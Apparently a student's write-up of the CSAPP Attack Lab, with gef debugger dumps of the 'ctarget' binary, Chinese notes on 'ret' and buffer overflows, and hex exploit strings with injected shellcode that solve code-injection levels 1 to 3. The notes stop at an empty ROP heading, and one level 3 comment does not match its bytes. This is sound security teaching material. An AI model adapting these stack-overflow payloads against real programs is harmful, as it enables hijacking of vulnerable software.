~~~shell
gef➤  disas getbuf 
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    rsp,0x28
   0x00000000004017ac <+4>:     mov    rdi,rsp
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    eax,0x1
   0x00000000004017b9 <+17>:    add    rsp,0x28
   0x00000000004017bd <+21>:    ret    
End of assembler dump.
~~~

~~~shell
gef➤  b touch1
Breakpoint 3 at 0x4017c0: file visible.c, line 25.
gef➤  disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    rsp,0x8
   0x00000000004017c4 <+4>:     mov    DWORD PTR [rip+0x202d0e],0x1        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    edi,0x4030c5
   0x00000000004017d3 <+19>:    call   0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    edi,0x1
   0x00000000004017dd <+29>:    call   0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    edi,0x0
   0x00000000004017e7 <+39>:    call   0x400e40 <exit@plt>
End of assembler dump.
~~~

~~~shell
rasm2 -a x86 -b 32 "nop; jmp esp"
90ffe4
~~~

~~~shell
$rcx   : 0x94              
$rdx   : 0x000000006066e3  →  0x0000000000000000
$rsp   : 0x0000005561dc78  →  "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA"
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x31              
$rdi   : 0x007ffff7fa9980  →  0x00000000fbad2288
$rip   : 0x000000004017b4  →  <getbuf+12> mov eax, 0x1
$r8    : 0xa               
$r9    : 0x7c              
$r10   : 0x000000004007af  →  "_IO_getc"
$r11   : 0x246             
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dc78│+0x0000: "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA"   ← $rax, $rsp
0x0000005561dc80│+0x0008: "ADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA"
0x0000005561dc88│+0x0010: "AAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA"
0x0000005561dc90│+0x0018: "IAAJAAKAALAAMAANAAOAAPAAQA"
0x0000005561dc98│+0x0020: "ALAAMAANAAOAAPAAQA"
0x0000005561dca0│+0x0028: "AAOAAPAAQA"
0x0000005561dca8│+0x0030: 0x00000000004151 ("QA"?)
0x0000005561dcb0│+0x0038: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017a8 <getbuf+0>       sub    rsp, 0x28
     0x4017ac <getbuf+4>       mov    rdi, rsp
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●→   0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
     0x4017bd <getbuf+21>      ret    
     0x4017be                  nop    
     0x4017bf                  nop    
     0x4017c0 <touch1+0>       sub    rsp, 0x8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017b4 in getbuf (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017b4 → getbuf()
~~~

~~~shell
$rbx   : 0x00000055586000  →  0x0000000000000000
$rcx   : 0x94              
$rdx   : 0x000000006066e3  →  0x0000000000000000
$rsp   : 0x0000005561dca0  →  "AAOAAPAAQA"
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x31              
$rdi   : 0x007ffff7fa9980  →  0x00000000fbad2288
$rip   : 0x000000004017bd  →  <getbuf+21> ret 
$r8    : 0xa               
$r9    : 0x7c              
$r10   : 0x000000004007af  →  "_IO_getc"
$r11   : 0x246             
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dca0│+0x0000: "AAOAAPAAQA"   ← $rsp
0x0000005561dca8│+0x0008: 0x00000000004151 ("QA"?)
0x0000005561dcb0│+0x0010: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
0x0000005561dcb8│+0x0018: 0x0000000000000000
0x0000005561dcc0│+0x0020: 0xf4f4f4f4f4f4f4f4
0x0000005561dcc8│+0x0028: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd0│+0x0030: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd8│+0x0038: 0xf4f4f4f4f4f4f4f4
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●    0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
 →   0x4017bd <getbuf+21>      ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017bd in getbuf (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017bd → getbuf()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
~~~



`ret` 指令是汇编语言中的一条指令，其全称为 "return"，在函数调用完成后用于从函数返回。它的具体作用可以分解为以下几个步骤：

1. **弹出返回地址**：`ret` 指令首先从调用函数时使用的栈中弹出返回地址。返回地址是函数被调用时压入栈的地址，指向调用函数后应当执行的下一条指令。
2. **跳转到返回地址**：`ret` 指令接着使程序的执行跳转到弹出的返回地址。这意味着程序的控制权从当前函数转移回了调用它的函数。
3. **栈指针调整**：执行 `ret` 指令后，栈指针（通常是 ESP 寄存器）会自动增加，以指向栈中下一个元素。这是因为返回地址已经从栈中弹出。

### 在函数调用中的作用

当一个函数被调用时，通常发生以下几个步骤：
- 调用指令（如 `call`）将返回地址（即 `call` 指令后的下一条指令地址）压入栈中。
- 然后程序跳转到被调用函数的起始位置执行。
- 在被调用函数执行完毕后，`ret` 指令负责从栈中弹出返回地址，并将程序的执行流程跳转回到这个地址。

### 在攻击中的作用

在某些类型的安全攻击中，比如缓冲区溢出攻击，攻击者可能会尝试操纵栈上的返回地址。如果攻击者能够控制栈上的数据，他们可以通过向栈中注入一个不同的地址，并在执行 `ret` 指令时强制程序跳转到一个非预期的、恶意的位置，这就实现了对程序流程的控制。这是为什么理解 `ret` 指令在安全领域非常重要的原因之一。

# 正常调用
~~~shell

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000005561dc78  →  "hello world!"
$rbx   : 0x00000055586000  →  0x0000000000000000
$rcx   : 0x22              
$rdx   : 0x000000006066bd  →  0x0000000000000000
$rsp   : 0x0000005561dc78  →  "hello world!"
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x31              
$rdi   : 0x007ffff7fa9980  →  0x00000000fbad2288
$rip   : 0x000000004017b4  →  <getbuf+12> mov eax, 0x1
$r8    : 0xa               
$r9    : 0x7c              
$r10   : 0x000000004007af  →  "_IO_getc"
$r11   : 0x246             
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dc78│+0x0000: "hello world!"         ← $rax, $rsp
0x0000005561dc80│+0x0008: 0x00000021646c72 ("rld!"?)
0x0000005561dc88│+0x0010: 0x0000000000000000
0x0000005561dc90│+0x0018: 0x0000000000000000
0x0000005561dc98│+0x0020: 0x00000055586000  →  0x0000000000000000
0x0000005561dca0│+0x0028: 0x00000000401976  →  <test+14> mov edx, eax
0x0000005561dca8│+0x0030: 0x00000000000009 ("\t"?)
0x0000005561dcb0│+0x0038: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017a8 <getbuf+0>       sub    rsp, 0x28
     0x4017ac <getbuf+4>       mov    rdi, rsp
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●→   0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
     0x4017bd <getbuf+21>      ret    
     0x4017be                  nop    
     0x4017bf                  nop    
     0x4017c0 <touch1+0>       sub    rsp, 0x8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017b4 in getbuf (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017b4 → getbuf()
[#1] 0x401976 → test()
[#2] 0x401f24 → launch(offset=<optimized out>)
[#3] 0x401ffa → stable_launch(offset=<optimized out>)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1               
$rbx   : 0x00000055586000  →  0x0000000000000000
$rcx   : 0x22              
$rdx   : 0x000000006066bd  →  0x0000000000000000
$rsp   : 0x0000005561dca0  →  0x00000000401976  →  <test+14> mov edx, eax
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x31              
$rdi   : 0x007ffff7fa9980  →  0x00000000fbad2288
$rip   : 0x000000004017bd  →  <getbuf+21> ret 
$r8    : 0xa               
$r9    : 0x7c              
$r10   : 0x000000004007af  →  "_IO_getc"
$r11   : 0x246             
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dca0│+0x0000: 0x00000000401976  →  <test+14> mov edx, eax    ← $rsp
0x0000005561dca8│+0x0008: 0x00000000000009 ("\t"?)
0x0000005561dcb0│+0x0010: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
0x0000005561dcb8│+0x0018: 0x0000000000000000
0x0000005561dcc0│+0x0020: 0xf4f4f4f4f4f4f4f4
0x0000005561dcc8│+0x0028: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd0│+0x0030: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd8│+0x0038: 0xf4f4f4f4f4f4f4f4
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●    0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
 →   0x4017bd <getbuf+21>      ret    
   ↳    0x401976 <test+14>        mov    edx, eax
        0x401978 <test+16>        mov    esi, 0x403188
        0x40197d <test+21>        mov    edi, 0x1
        0x401982 <test+26>        mov    eax, 0x0
        0x401987 <test+31>        call   0x400df0 <__printf_chk@plt>
        0x40198c <test+36>        add    rsp, 0x8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017bd in getbuf (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017bd → getbuf()
[#1] 0x401976 → test()
[#2] 0x401f24 → launch(offset=<optimized out>)
[#3] 0x401ffa → stable_launch(offset=<optimized out>)

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000055586000  →  0x0000000000000000
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x0000005561dca8  →  0x00000000000009 ("\t"?)
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x7274732065707954 ("Type str"?)
$rdi   : 0x007ffff7fab7e0  →  0x0000000000000000
$rip   : 0x00000000401971  →  <test+9> call 0x4017a8 <getbuf>
$r8    : 0x0               
$r9    : 0xc               
$r10   : 0x00000000400704  →  0x5f007465736d656d ("memset"?)
$r11   : 0x007ffff7f48d90  →  <__memset_avx2_unaligned_erms+0> endbr64 
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dca8│+0x0000: 0x00000000000009 ("\t"?)       ← $rsp
0x0000005561dcb0│+0x0008: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
0x0000005561dcb8│+0x0010: 0x0000000000000000
0x0000005561dcc0│+0x0018: 0xf4f4f4f4f4f4f4f4
0x0000005561dcc8│+0x0020: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd0│+0x0028: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd8│+0x0030: 0xf4f4f4f4f4f4f4f4
0x0000005561dce0│+0x0038: 0xf4f4f4f4f4f4f4f4
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401963 <touch3+105>     call   0x400e40 <exit@plt>
     0x401968 <test+0>         sub    rsp, 0x8
     0x40196c <test+4>         mov    eax, 0x0
●→   0x401971 <test+9>         call   0x4017a8 <getbuf>
   ↳    0x4017a8 <getbuf+0>       sub    rsp, 0x28
        0x4017ac <getbuf+4>       mov    rdi, rsp
        0x4017af <getbuf+7>       call   0x401a40 <Gets>
        0x4017b4 <getbuf+12>      mov    eax, 0x1
        0x4017b9 <getbuf+17>      add    rsp, 0x28
        0x4017bd <getbuf+21>      ret    
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments ────
getbuf (<void>)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x401971 in test (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401971 → test()
[#1] 0x401f24 → launch(offset=<optimized out>)
[#2] 0x401ffa → stable_launch(offset=<optimized out>)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

gef➤  x /4w 0x401971
0x401971 <test+9>:      0xfffe32e8      0xbec289ff      0x403188        0x1bf
gef➤  disas test 
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    rsp,0x8
   0x000000000040196c <+4>:     mov    eax,0x0
=> 0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    edx,eax
   0x0000000000401978 <+16>:    mov    esi,0x403188
   0x000000000040197d <+21>:    mov    edi,0x1
   0x0000000000401982 <+26>:    mov    eax,0x0
   0x0000000000401987 <+31>:    call   0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    rsp,0x8
   0x0000000000401990 <+40>:    ret    
End of assembler dump.

0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
~~~

# Level1
~~~shell
~/new_space/CSAPP_Lab/Attack/target1 (master*) » cat exploit.txt | ./hex2raw | ./ctarget -q         czy@czy-307-thinkcentre-m720q-n000
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:41 41 41 42 41 41 43 41 41 44 41 41 45 41 41 46 41 41 47 41 41 48 41 41 49 41 41 4A 41 41 4B 41 41 4C 41 41 4D 41 41 4E C0 17 40 00

~/new_space/CSAPP_Lab/Attack/target1 (master*) » bat exploit.txt                                    czy@czy-307-thinkcentre-m720q-n000
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: exploit.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 41 41 41 42 41 41 43 41 41 44 41 41 45 41 41 46 41 41 47 41 41 48 41 41 49 41 41 4A 41 41 4B 41 41 4C 41 41 4D 41 41 4E C0 17 
       │ 40 00 /* Level 1*/
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
---------------------------------------------------------------------------------------------------------------------------------------
~/new_space/CSAPP_Lab/Attack/target1 (master) »          
~~~

# Level 2
~~~c
1 void touch2(unsigned val)
2 {
3   vlevel = 2; /* 验证协议的一部分 */
4   if (val == cookie) {
5     printf("Touch2!：你调用了 touch2(0x%.8x)\n", val);
6     validate(2);
7   } else {
8     printf("未命中：你调用了 touch2(0x%.8x)\n", val);
9     fail(2);
10  }
11  exit(0);
12 }
~~~

要完成这个任务，我们需要构造一个攻击字符串，该字符串在执行到 `getbuf` 函数的 `ret` 指令时，能够重定向执行流到 `touch2` 函数，并且看起来像是 `touch2` 被正确调用了，即携带了正确的参数（你的 cookie）。


1. **找到 `touch2` 函数的地址**：首先，需要确定 `touch2` 函数的地址。这通常通过分析目标程序的符号表来完成。
2. **构造攻击代码**：你需要编写一小段汇编代码，这段代码将你的 cookie 值放入 `rdi` 寄存器（在 x86-64 架构中，函数的第一个参数通过 `rdi` 传递），然后执行 `ret` 指令。这段代码将替代 `getbuf` 函数的返回地址。
3. **确定缓冲区的大小和 `getbuf` 的返回地址**：你需要知道 `getbuf` 函数内部分配的缓冲区的大小，以及 `getbuf` 的返回地址在栈上的位置。这样，你就可以在缓冲区溢出时覆盖返回地址。
4. **构造完整的攻击字符串**：攻击字符串将包含你的攻击代码、一些填充字节（如果需要的话），以及 `touch2` 函数的地址。这个字符串将覆盖 `getbuf` 的栈空间，使得 `ret` 指令将控制权转移到你的攻击代码，然后你的代码将进一步跳转到 `touch2`。

这个过程的具体实现依赖于目标程序的具体内存布局和函数调用约定。以下是一个大致的攻击代码示例，假设你已经知道了 `touch2` 的地址和所需的 cookie 值：

```asm
movq $0x59b997fa, %rdi  
pushq $0x4017ec  
ret                        
```

将上述汇编代码转换为机器码，并构造出完整的攻击字符串。这个字符串首先包含一些填充字节（如果需要），然后是上述机器码，最后是 `getbuf` 函数返回地址处的 `touch2` 函数地址。攻击字符串的确切构造取决于栈的布局和缓冲区的大小。


*[master][~/new_space/CSAPP_Lab/Attack/target1]$ cat exploit.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 93 DC 61 55 
*[master][~/new_space/CSAPP_Lab/Attack/target1]$ bat exploit.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: exploit.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 ~ │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   2 ~ │ 48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */
   3 ~ │ 68 ec 17 40 00          /* pushq  $0x4017ec */
   4 ~ │ c3                      /* retq */
   5 ~ │ 93 DC 61 55             
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
*[master][~/new_space/CSAPP_Lab/Attack/target1]$ 


# Level 3
~~~shell
gef➤  disas touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:     push   rbx
   0x00000000004018fb <+1>:     mov    rbx,rdi
   0x00000000004018fe <+4>:     mov    DWORD PTR [rip+0x202bd4],0x3        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    rsi,rdi
   0x000000000040190b <+17>:    mov    edi,DWORD PTR [rip+0x202bd3]        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    call   0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   eax,eax
   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
   0x000000000040191a <+32>:    mov    rdx,rbx
   0x000000000040191d <+35>:    mov    esi,0x403138
   0x0000000000401922 <+40>:    mov    edi,0x1
   0x0000000000401927 <+45>:    mov    eax,0x0
   0x000000000040192c <+50>:    call   0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:    mov    edi,0x3
   0x0000000000401936 <+60>:    call   0x401c8d <validate>
   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:    mov    rdx,rbx
   0x0000000000401940 <+70>:    mov    esi,0x403160
   0x0000000000401945 <+75>:    mov    edi,0x1
   0x000000000040194a <+80>:    mov    eax,0x0
   0x000000000040194f <+85>:    call   0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:    mov    edi,0x3
   0x0000000000401959 <+95>:    call   0x401d4f <fail>
   0x000000000040195e <+100>:   mov    edi,0x0
   0x0000000000401963 <+105>:   call   0x400e40 <exit@plt>
End of assembler dump.

gef➤  disas hexmatch
Dump of assembler code for function hexmatch:
   0x000000000040184c <+0>:     push   r12
   0x000000000040184e <+2>:     push   rbp
   0x000000000040184f <+3>:     push   rbx
   0x0000000000401850 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000401854 <+8>:     mov    r12d,edi
   0x0000000000401857 <+11>:    mov    rbp,rsi
   0x000000000040185a <+14>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401863 <+23>:    mov    QWORD PTR [rsp+0x78],rax
   0x0000000000401868 <+28>:    xor    eax,eax
   0x000000000040186a <+30>:    call   0x400db0 <random@plt>
   0x000000000040186f <+35>:    mov    rcx,rax
   0x0000000000401872 <+38>:    movabs rdx,0xa3d70a3d70a3d70b
   0x000000000040187c <+48>:    imul   rdx
   0x000000000040187f <+51>:    add    rdx,rcx
   0x0000000000401882 <+54>:    sar    rdx,0x6
   0x0000000000401886 <+58>:    mov    rax,rcx
   0x0000000000401889 <+61>:    sar    rax,0x3f
   0x000000000040188d <+65>:    sub    rdx,rax
   0x0000000000401890 <+68>:    lea    rax,[rdx+rdx*4]
   0x0000000000401894 <+72>:    lea    rax,[rax+rax*4]
   0x0000000000401898 <+76>:    shl    rax,0x2
   0x000000000040189c <+80>:    sub    rcx,rax
   0x000000000040189f <+83>:    lea    rbx,[rsp+rcx*1]
   0x00000000004018a3 <+87>:    mov    r8d,r12d
   0x00000000004018a6 <+90>:    mov    ecx,0x4030e2
   0x00000000004018ab <+95>:    mov    rdx,0xffffffffffffffff
   0x00000000004018b2 <+102>:   mov    esi,0x1
   0x00000000004018b7 <+107>:   mov    rdi,rbx
   0x00000000004018ba <+110>:   mov    eax,0x0
   0x00000000004018bf <+115>:   call   0x400e70 <__sprintf_chk@plt>
   0x00000000004018c4 <+120>:   mov    edx,0x9
   0x00000000004018c9 <+125>:   mov    rsi,rbx
   0x00000000004018cc <+128>:   mov    rdi,rbp
   0x00000000004018cf <+131>:   call   0x400ca0 <strncmp@plt>
   0x00000000004018d4 <+136>:   test   eax,eax
   0x00000000004018d6 <+138>:   sete   al
   0x00000000004018d9 <+141>:   movzx  eax,al
   0x00000000004018dc <+144>:   mov    rsi,QWORD PTR [rsp+0x78]
   0x00000000004018e1 <+149>:   xor    rsi,QWORD PTR fs:0x28
   0x00000000004018ea <+158>:   je     0x4018f1 <hexmatch+165>
   0x00000000004018ec <+160>:   call   0x400ce0 <__stack_chk_fail@plt>
   0x00000000004018f1 <+165>:   sub    rsp,0xffffffffffffff80
   0x00000000004018f5 <+169>:   pop    rbx
   0x00000000004018f6 <+170>:   pop    rbp
   0x00000000004018f7 <+171>:   pop    r12
   0x00000000004018f9 <+173>:   ret    
End of assembler dump.


────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4018fe <touch3+4>       mov    DWORD PTR [rip+0x202bd4], 0x3        # 0x6044dc <vlevel>
     0x401908 <touch3+14>      mov    rsi, rdi
     0x40190b <touch3+17>      mov    edi, DWORD PTR [rip+0x202bd3]        # 0x6044e4 <cookie>
 →   0x401911 <touch3+23>      call   0x40184c <hexmatch>
   ↳    0x40184c <hexmatch+0>     push   r12
        0x40184e <hexmatch+2>     push   rbp
        0x40184f <hexmatch+3>     push   rbx
        0x401850 <hexmatch+4>     add    rsp, 0xffffffffffffff80
        0x401854 <hexmatch+8>     mov    r12d, edi
        0x401857 <hexmatch+11>    mov    rbp, rsi
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments ────
hexmatch (
   unsigned int var_0 = 0x00000059b997fa,
   QWORD var_1 = 0x0000005561dc78 → "59b997fa"
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x401911 in touch3 (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401911 → touch3(sval=0x5561dc78 "59b997fa")
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
~~~

~~~shell
➜  target1 git:(master) ✗ ./ctarget -i exploit-raw.txt -q          
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 93 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
➜  target1 git:(master) ✗ bat exploit.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: exploit.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   2 ~ │ 48 c7 c7 a8 dc 61 55    /* mov    $0x5561dc88,%rdi */
   3 ~ │ 68 fa 18 40 00          /* pushq  $0x4018fa */
   4   │ c3                      /* retq */
   5 ~ │ 93 DC 61 55 00 00 00 00           
   6 ~ │ 35 39 62 39 39 37 66 61 00

$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dc78│+0x0000: 0x0000000000000000     ← $rax, $rsp
0x0000005561dc80│+0x0008: 0x0000000000000000
0x0000005561dc88│+0x0010: 0x0000000000000000
0x0000005561dc90│+0x0018: 0xdca8c7c748000000
0x0000005561dc98│+0x0020: 0xc3004018fa685561
0x0000005561dca0│+0x0028: 0x0000005561dc93  →  0x685561dca8c7c748
0x0000005561dca8│+0x0030: "59b997fa"
0x0000005561dcb0│+0x0038: 0x00000000400000  →   jg 0x400047
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017a8 <getbuf+0>       sub    rsp, 0x28
     0x4017ac <getbuf+4>       mov    rdi, rsp
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●→   0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
     0x4017bd <getbuf+21>      ret    
     0x4017be                  nop    
     0x4017bf                  nop    
     0x4017c0 <touch1+0>       sub    rsp, 0x8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017b4 in getbuf (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017b4 → getbuf()
[#1] 0x5561dc93 → mov rdi, 0x5561dca8
~~~


# ROP 
# Level 1